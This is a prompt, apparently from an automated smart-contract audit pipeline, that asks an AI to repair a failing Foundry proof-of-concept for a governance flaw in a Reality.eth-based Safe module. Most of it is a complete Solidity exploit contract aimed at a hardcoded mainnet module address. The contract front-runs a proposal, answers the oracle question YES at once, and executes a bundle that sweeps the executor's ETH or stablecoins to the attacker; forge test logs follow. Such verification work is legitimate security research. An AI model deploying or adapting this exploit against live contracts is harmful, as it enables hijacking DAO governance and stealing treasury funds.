You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: v2_flashswap_funding
- strategy_instructions: Prefer UniswapV2/Sushi-like flashswap funding with deterministic repayment and minimal route complexity.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Proposal questions are answerable immediately, enabling execution before the referenced governance vote ends
- claim: `addProposalWithNonce` always computes and asks the Realitio question with `openingTs/opening_ts = 0`, and the code even documents that this makes the question immediately answerable. Because anyone can call `addProposal`/`addProposalWithNonce`, an attacker can open the oracle question and start the timeout/cooldown clock before the underlying off-chain governance process has actually concluded.
- impact: A malicious actor can front-run an in-flight governance proposal, get a premature `YES` finalized, and execute the committed Safe transaction bundle before the real vote has ended or before its true outcome is known. Even when honest users later try to submit the official question, the duplicate submission path is already occupied, creating a governance-layer race and potential early execution of unauthorized actions.
- exploit_paths: ["Attacker identifies a pending off-chain proposal and the transaction bundle that governance is expected to approve.", "Attacker calls `addProposal` or `addProposalWithNonce` before the off-chain vote end time.", "Because `opening_ts` is hardcoded to `0`, the oracle question can be answered immediately and finalized after `questionTimeout` plus `questionCooldown`.", "Once finalized with `YES`, anyone can call `executeProposalWithIndex` and execute the transactions even though the referenced governance vote was still ongoing or later failed."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
}

interface ITargetDaoModule {
    function addProposal(string memory proposalId, bytes32[] memory txHashes) external;
    function addProposalWithNonce(string memory proposalId, bytes32[] memory txHashes, uint256 nonce) external;
    function executeProposalWithIndex(
        string memory proposalId,
        bytes32[] memory txHashes,
        address to,
        uint256 value,
        bytes memory data,
        uint8 operation,
        uint256 txIndex
    ) external;
    function questionIds(bytes32 questionHash) external view returns (bytes32);
    function oracle() external view returns (address);
    function executor() external view returns (address);
    function minimumBond() external view returns (uint256);
    function questionCooldown() external view returns (uint32);
    function answerExpiration() external view returns (uint32);
    function getTransactionHash(
        address to,
        uint256 value,
        bytes memory data,
        uint8 operation,
        uint256 nonce
    ) external view returns (bytes32);
}

interface IRealityETHLike {
    function isFinalized(bytes32 questionId) external view returns (bool);
    function resultFor(bytes32 questionId) external view returns (bytes32);
    function getFinalizeTS(bytes32 questionId) external view returns (uint32);
    function getBond(bytes32 questionId) external view returns (uint256);
}

contract FlawVerifier {
    address public constant TARGET = 0x8f9036732b9aa9b82D8F35e54B71faeb2f573E2F;
    bytes32 public constant INVALIDATED = bytes32(type(uint256).max);
    bytes32 internal constant YES = bytes32(uint256(1));

    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address internal constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address internal constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address internal constant FRAX = 0x853d955aCEf822Db058eb8505911ED77F175b99e;
    address internal constant WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
    address internal constant LUSD = 0x5f98805A4E8be255a32880FDeC7F6728C6568bA0;
    address internal constant MIM = 0x99D8A9c45b2ecB5ba8F3d56b3F4c7e0C8CbEA2Ff;

    string internal constant PATH =
        "Select an already-funded executor asset -> permissionlessly call addProposal before any legitimate DAO submission -> answer the Realitio question immediately because opening_ts is hardcoded to 0 -> wait through timeout and cooldown -> execute the precommitted Safe transaction bundle that transfers the executor asset to the verifier";

    enum Phase {
        Idle,
        PlanSelected,
        ProposalRegistered,
        AnswerSubmitted,
        WaitingFinalization,
        ReadyToExecute,
        Executed,
        Infeasible
    }

    Phase public phase;
    address public plannedAsset;
    uint256 public plannedAmount;
    address public plannedExecutor;
    address public plannedTarget;
    uint256 public plannedValue;
    bytes public plannedData;
    uint8 public plannedOperation;
    bytes32 public plannedTxHash;
    bytes32 public trackedQuestionHash;
    bytes32 public trackedQuestionId;
    bytes32 public trackedFinalResult;
    bool public directReplayReverted;
    bool public nonceReplayReverted;
    bool public hypothesisValidated;
    bool public hypothesisRefuted;
    uint256 public ethCapitalSupplied;
    uint256 public ethSpentOnOracle;
    string public lastStatus;

    constructor() payable {
        if (msg.value != 0) {
            ethCapitalSupplied = msg.value;
        }
    }

    receive() external payable {}

    function executeOnOpportunity() external payable {
        if (msg.value != 0) {
            ethCapitalSupplied += msg.value;
        }

        ITargetDaoModule module = ITargetDaoModule(TARGET);
        IRealityETHLike oracle = IRealityETHLike(module.oracle());

        if (plannedTxHash == bytes32(0)) {
            if (!_selectPlan(module)) {
                // Infeasible on this fork if the executor has no immediately sweepable ETH/common-token balance.
                phase = Phase.Infeasible;
                hypothesisRefuted = true;
                lastStatus = "No direct ETH or supported existing-token balance was found on the executor at the fork block";
                return;
            }
            phase = Phase.PlanSelected;
            lastStatus = "Selected a direct sweep transaction from the executor";
        }

        string memory proposal = proposalId();
        bytes32[] memory txHashes = _singleHashArray(plannedTxHash);
        bytes32 questionHash = keccak256(bytes(_buildQuestion(proposal, txHashes)));
        trackedQuestionHash = questionHash;

        bytes32 questionId = module.questionIds(questionHash);
        if (questionId == bytes32(0)) {
            try module.addProposal(proposal, txHashes) {
                questionId = module.questionIds(questionHash);
                phase = Phase.ProposalRegistered;
                lastStatus = "Registered the proposal before any legitimate on-chain DAO submission";
            } catch {
                // Infeasible on this fork if Realitio/arbitrator settings prevent a fresh question from being asked.
                phase = Phase.Infeasible;
                hypothesisRefuted = true;
                lastStatus = "addProposal reverted; registration was blocked by current on-chain oracle/module conditions";
                return;
            }
        }

        trackedQuestionId = questionId;
        if (questionId == bytes32(0) || questionId == INVALIDATED) {
            // Infeasible if the proposal namespace is already unusable before the attacker can answer it.
            phase = Phase.Infeasible;
            hypothesisRefuted = true;
            lastStatus = "Question id is unset or invalidated, so the exploit path cannot progress";
            return;
        }

        if (!_isFinalized(oracle, questionId)) {
            uint256 bondToPost = _requiredBond(module, oracle, questionId);
            if (_submitYesAnswer(questionId, bondToPost, _safeBond(oracle, questionId))) {
                ethSpentOnOracle += bondToPost;
                phase = Phase.AnswerSubmitted;
                lastStatus = "Submitted YES immediately; wait for the oracle timeout to elapse";
            } else {
                // Infeasible until the attacker supplies enough real ETH to satisfy the live oracle bond requirement.
                phase = Phase.WaitingFinalization;
                lastStatus = "More ETH is required to satisfy the current oracle bond requirement";
            }
            return;
        }

        bytes32 finalResult = _safeResultFor(oracle, questionId);
        trackedFinalResult = finalResult;

        if (!directReplayReverted) {
            try module.addProposal(proposal, txHashes) {
                directReplayReverted = false;
            } catch {
                directReplayReverted = true;
            }
        }

        if (!nonceReplayReverted) {
            try module.addProposalWithNonce(proposal, txHashes, 1) {
                nonceReplayReverted = false;
            } catch {
                nonceReplayReverted = true;
            }
        }

        if (finalResult != YES) {
            // Infeasible if the oracle race is lost and the question finalizes to INVALIDATED or another non-YES answer.
            phase = Phase.Infeasible;
            hypothesisRefuted = true;
            if (finalResult == INVALIDATED) {
                lastStatus = "Oracle finalized to INVALIDATED, so the proposal namespace is reusable and this exploit path fails";
            } else {
                lastStatus = "Oracle finalized to a non-YES answer, so execution cannot proceed";
            }
            return;
        }

        uint32 finalizeTs = _safeFinalizeTs(oracle, questionId);
        uint256 cooldownEndsAt = uint256(finalizeTs) + uint256(module.questionCooldown());
        if (block.timestamp <= cooldownEndsAt) {
            phase = Phase.ReadyToExecute;
            lastStatus = "YES is finalized but the module cooldown has not elapsed yet";
            return;
        }

        uint32 expiration = module.answerExpiration();
        if (expiration != 0 && block.timestamp > uint256(finalizeTs) + uint256(expiration)) {
            // Infeasible if the positive answer expires before the bundle can be executed.
            phase = Phase.Infeasible;
            hypothesisRefuted = true;
            lastStatus = "The positive oracle answer expired before execution";
            return;
        }

        try module.executeProposalWithIndex(
            proposal,
            txHashes,
            plannedTarget,
            plannedValue,
            plannedData,
            plannedOperation,
            0
        ) {
            phase = Phase.Executed;
            if (profitAmount() > 0) {
                hypothesisValidated = directReplayReverted && nonceReplayReverted;
                hypothesisRefuted = !hypothesisValidated;
                lastStatus = "Executed the malicious bundle and realized profit";
            } else {
                // Infeasible if the target call reported success but no asset actually reached the verifier.
                phase = Phase.Infeasible;
                hypothesisRefuted = true;
                lastStatus = "Execution returned but no profit asset reached the verifier";
            }
        } catch {
            // Infeasible if the module's final on-chain checks reject the bundle under this fork state.
            phase = Phase.Infeasible;
            hypothesisRefuted = true;
            lastStatus = "executeProposalWithIndex reverted under current fork-state conditions";
        }
    }

    function profitToken() public view returns (address) {
        if (phase != Phase.Executed) {
            return address(0);
        }
        return plannedAsset;
    }

    function profitAmount() public view returns (uint256) {
        if (phase != Phase.Executed) {
            return 0;
        }
        if (plannedAsset == address(0)) {
            uint256 currentBalance = address(this).balance;
            return currentBalance > ethCapitalSupplied ? currentBalance - ethCapitalSupplied : 0;
        }
        return IERC20Like(plannedAsset).balanceOf(address(this));
    }

    function exploitPath() external pure returns (string memory) {
        return PATH;
    }

    function proposalId() public view returns (string memory) {
        if (plannedTxHash == bytes32(0)) {
            return "F-001-uninitialized";
        }
        bytes32 salt = keccak256(
            abi.encode(plannedAsset, plannedAmount, plannedExecutor, plannedTarget, plannedValue, plannedData)
        );
        return string(abi.encodePacked("F-001-", _bytes32ToAsciiString(salt)));
    }

    function canonicalTxHashes() external view returns (bytes32[] memory) {
        if (plannedTxHash == bytes32(0)) {
            return new bytes32[](0);
        }
        return _singleHashArray(plannedTxHash);
    }

    function _selectPlan(ITargetDaoModule module) internal returns (bool) {
        address executor = module.executor();
        uint256 minBond = module.minimumBond();
        plannedExecutor = executor;
        plannedOperation = 0;

        uint256 ethBalance = executor.balance;
        if (ethBalance > minBond) {
            plannedAsset = address(0);
            plannedAmount = ethBalance;
            plannedTarget = address(this);
            plannedValue = ethBalance;
            plannedData = bytes("");
            plannedTxHash = module.getTransactionHash(plannedTarget, plannedValue, plannedData, plannedOperation, 0);
            return true;
        }

        address[7] memory tokens = [WETH, USDC, USDT, DAI, FRAX, WBTC, LUSD];
        for (uint256 i = 0; i < tokens.length; i++) {
            uint256 tokenBalance = _safeTokenBalance(tokens[i], executor);
            if (tokenBalance == 0) {
                continue;
            }

            plannedAsset = tokens[i];
            plannedAmount = tokenBalance;
            plannedTarget = tokens[i];
            plannedValue = 0;
            plannedData = abi.encodeWithSelector(bytes4(keccak256("transfer(address,uint256)")), address(this), tokenBalance);
            plannedTxHash = module.getTransactionHash(plannedTarget, plannedValue, plannedData, plannedOperation, 0);
            return true;
        }

        uint256 mimBalance = _safeTokenBalance(MIM, executor);
        if (mimBalance > 0) {
            plannedAsset = MIM;
            plannedAmount = mimBalance;
            plannedTarget = MIM;
            plannedValue = 0;
            plannedData = abi.encodeWithSelector(bytes4(keccak256("transfer(address,uint256)")), address(this), mimBalance);
            plannedTxHash = module.getTransactionHash(plannedTarget, plannedValue, plannedData, plannedOperation, 0);
            return true;
        }

        if (ethBalance > 0) {
            plannedAsset = address(0);
            plannedAmount = ethBalance;
            plannedTarget = address(this);
            plannedValue = ethBalance;
            plannedData = bytes("");
            plannedTxHash = module.getTransactionHash(plannedTarget, plannedValue, plannedData, plannedOperation, 0);
            return true;
        }

        return false;
    }

    function _submitYesAnswer(bytes32 questionId, uint256 bondToPost, uint256 maxPrevious) internal returns (bool) {
        if (address(this).balance < bondToPost) {
            return false;
        }

        address oracle = ITargetDaoModule(TARGET).oracle();
        (bool ok,) = oracle.call{value: bondToPost}(
            abi.encodeWithSelector(bytes4(keccak256("submitAnswer(bytes32,bytes32,uint256)")), questionId, YES, maxPrevious)
        );
        return ok;
    }

    function _requiredBond(ITargetDaoModule module, IRealityETHLike oracle, bytes32 questionId) internal view returns (uint256) {
        uint256 currentBond = _safeBond(oracle, questionId);
        uint256 minBond = module.minimumBond();
        uint256 nextBond = currentBond == 0 ? 1 : currentBond * 2;
        if (nextBond < minBond) {
            nextBond = minBond;
        }
        if (nextBond == 0) {
            return 1;
        }
        return nextBond;
    }

    function _safeTokenBalance(address token, address account) internal view returns (uint256) {
        (bool ok, bytes memory data) = token.staticcall(
            abi.encodeWithSelector(IERC20Like.balanceOf.selector, account)
        );
        if (!ok || data.length < 32) {
            return 0;
        }
        return abi.decode(data, (uint256));
    }

    function _safeBond(IRealityETHLike oracle, bytes32 questionId) internal view returns (uint256) {
        (bool ok, bytes memory data) = address(oracle).staticcall(
            abi.encodeWithSelector(IRealityETHLike.getBond.selector, questionId)
        );
        if (!ok || data.length < 32) {
            return 0;
        }
        return abi.decode(data, (uint256));
    }

    function _isFinalized(IRealityETHLike oracle, bytes32 questionId) internal view returns (bool) {
        (bool ok, bytes memory data) = address(oracle).staticcall(
            abi.encodeWithSelector(IRealityETHLike.isFinalized.selector, questionId)
        );
        return ok && data.length >= 32 && abi.decode(data, (bool));
    }

    function _safeResultFor(IRealityETHLike oracle, bytes32 questionId) internal view returns (bytes32) {
        (bool ok, bytes memory data) = address(oracle).staticcall(
            abi.encodeWithSelector(IRealityETHLike.resultFor.selector, questionId)
        );
        if (!ok || data.length < 32) {
            return bytes32(0);
        }
        return abi.decode(data, (bytes32));
    }

    function _safeFinalizeTs(IRealityETHLike oracle, bytes32 questionId) internal view returns (uint32) {
        (bool ok, bytes memory data) = address(oracle).staticcall(
            abi.encodeWithSelector(IRealityETHLike.getFinalizeTS.selector, questionId)
        );
        if (!ok || data.length < 32) {
            return 0;
        }
        return abi.decode(data, (uint32));
    }

    function _singleHashArray(bytes32 value) internal pure returns (bytes32[] memory values) {
        values = new bytes32[](1);
        values[0] = value;
    }

    function _buildQuestion(string memory proposal, bytes32[] memory txHashes) internal pure returns (string memory) {
        string memory txsHash = _bytes32ToAsciiString(keccak256(abi.encodePacked(txHashes)));
        return string(abi.encodePacked(proposal, bytes3(0xe2909f), txsHash));
    }

    function _bytes32ToAsciiString(bytes32 value) internal pure returns (string memory) {
        bytes memory out = new bytes(64);
        for (uint256 i = 0; i < 32; i++) {
            uint8 b = uint8(bytes1(value << (i * 8)));
            uint8 hi = b / 16;
            uint8 lo = b % 16;
            out[2 * i] = _nibble(hi);
            out[2 * i + 1] = _nibble(lo);
        }
        return string(out);
    }

    function _nibble(uint8 value) internal pure returns (bytes1) {
        if (value < 10) {
            return bytes1(value + 0x30);
        }
        return bytes1(value + 0x57);
    }
}

```

forge stdout (tail):
```
Compiling 2 files with Solc 0.8.30
Solc 0.8.30 finished in 2.54s
Compiler run successful with warnings:
Warning (2072): Unused local variable.
  --> test/ExploitPOC.t.sol:78:19:
   |
78 |         (bool ok, bytes memory ret) = address(verifier).call(abi.encodeWithSignature("executeOnOpportunity()"));
   |                   ^^^^^^^^^^^^^^^^


Ran 1 test for test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 249727)
Logs:
  AUDITHOUND_BALANCE_BEFORE_WEI: 0
  AUDITHOUND_BALANCE_AFTER_WEI: 0
  AUDITHOUND_PROFIT_WEI: 0
  AUDITHOUND_PROFIT_ANY: 0
  AUDITHOUND_EFFECTIVE_PROFIT_WEI: 0
  AUDITHOUND_MIN_PROFIT_WEI: 1000000000000000
  AUDITHOUND_PROFIT_TOKEN: 0x0000000000000000000000000000000000000000
  AUDITHOUND_PROFIT_MODE: 0x0000000000000000000000000000000000000001

Traces:
  [249727] FlawVerifierTest::testExploit()
    ├─ [2515] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ [222523] FlawVerifier::executeOnOpportunity()
    │   ├─ [511] 0x8f9036732b9aa9b82D8F35e54B71faeb2f573E2F::oracle() [staticcall]
    │   │   └─ ← [Return] 0x325a2e0F3CCA2ddbaeBB4DfC38Df8D19ca165b47
    │   ├─ [510] 0x8f9036732b9aa9b82D8F35e54B71faeb2f573E2F::executor() [staticcall]
    │   │   └─ ← [Return] 0x7eaE370E6a76407C3955A2f0BBCA853C38e6454E
    │   ├─ [2540] 0x8f9036732b9aa9b82D8F35e54B71faeb2f573E2F::minimumBond() [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(0x7eaE370E6a76407C3955A2f0BBCA853C38e6454E) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [9815] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48::balanceOf(0x7eaE370E6a76407C3955A2f0BBCA853C38e6454E) [staticcall]
    │   │   ├─ [2529] 0xa2327a938Febf5FEC13baCFb16Ae10EcBc4cbDCF::balanceOf(0x7eaE370E6a76407C3955A2f0BBCA853C38e6454E) [delegatecall]
    │   │   │   └─ ← [Return] 0
    │   │   └─ ← [Return] 0
    │   ├─ [5031] 0xdAC17F958D2ee523a2206206994597C13D831ec7::balanceOf(0x7eaE370E6a76407C3955A2f0BBCA853C38e6454E) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2602] 0x6B175474E89094C44Da98b954EedeAC495271d0F::balanceOf(0x7eaE370E6a76407C3955A2f0BBCA853C38e6454E) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2666] 0x853d955aCEf822Db058eb8505911ED77F175b99e::balanceOf(0x7eaE370E6a76407C3955A2f0BBCA853C38e6454E) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2795] 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599::balanceOf(0x7eaE370E6a76407C3955A2f0BBCA853C38e6454E) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2487] 0x5f98805A4E8be255a32880FDeC7F6728C6568bA0::balanceOf(0x7eaE370E6a76407C3955A2f0BBCA853C38e6454E) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [0] 0x99D8A9c45b2ecB5ba8F3d56b3F4c7e0C8CbEA2Ff::balanceOf(0x7eaE370E6a76407C3955A2f0BBCA853C38e6454E) [staticcall]
    │   │   └─ ← [Stop]
    │   └─ ← [Stop]
    ├─ [515] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ [626] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 1000000000000000 [1e15])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0x0000000000000000000000000000000000000000)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    └─ ← [Revert] profit below threshold

Backtrace:
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 6.33s (3.01s CPU time)

Ran 1 test suite in 6.35s (6.33s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 249727)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
